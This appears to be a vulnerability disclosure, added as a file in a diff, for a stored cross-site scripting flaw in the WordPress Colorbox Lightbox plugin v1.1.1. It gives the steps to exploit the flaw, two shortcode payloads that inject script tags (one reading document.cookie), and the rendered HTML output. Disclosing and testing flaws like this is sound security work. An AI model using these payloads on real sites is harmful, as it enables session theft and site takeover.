@@ -1,0 +1,32 @@
+# Exploit Title: WordPress Plugin Colorbox Lightbox v1.1.1 - Persistent Cross-Site Scripting Vulnerability (Authenticated)
+# Date: 10.8.2020.
+# Exploit Author: n1x_ [MS-WEB]
+# Software Homepage: https://wordpress.org/plugins/wp-colorbox/
+# Software Link (v1.1.1): https://downloads.wordpress.org/plugin/wp-colorbox.1.1.1.zip 
+# Product Version: 1.1.1
+
+[Description]
+
+# WordPress Colorbox plugin is a simple lightbox tool for WordPress. It allows users to pop up content in lightbox using the popular jQuery ColorBox library. 
+
+# Due to improper input santitization of "hyperlink" field, of the plugin shortcode, version v1.1.1 (and possibly previous versions), are affected by a stored XSS vulnerability.
+
+[Proof of Concept]
+
+# 1. Authorization as user with privileges to write and publish posts
+# 2. Injecting code into "hyperlink" field of the plugin shorthocode, and publishing the post
+# 3. The code is stored on the post
+
+
+[Example payloads]
+
+
+# Example payload 1: [wp_colorbox_media url="http://www.youtube.com/embed/example" type="youtube" hyperlink="<script>alert(document.cookie)</script>"]
+
+# Example payload 2: [wp_colorbox_media url="http://www.youtube.com/embed/example" type="youtube" hyperlink="<script>alert('sampletext')</script>"]
+
+[Response]
+
+...
+<a class="wp-colorbox-youtube" href="http://www.youtube.com/embed/example"><script>alert('sampletext')</script></a>
+...
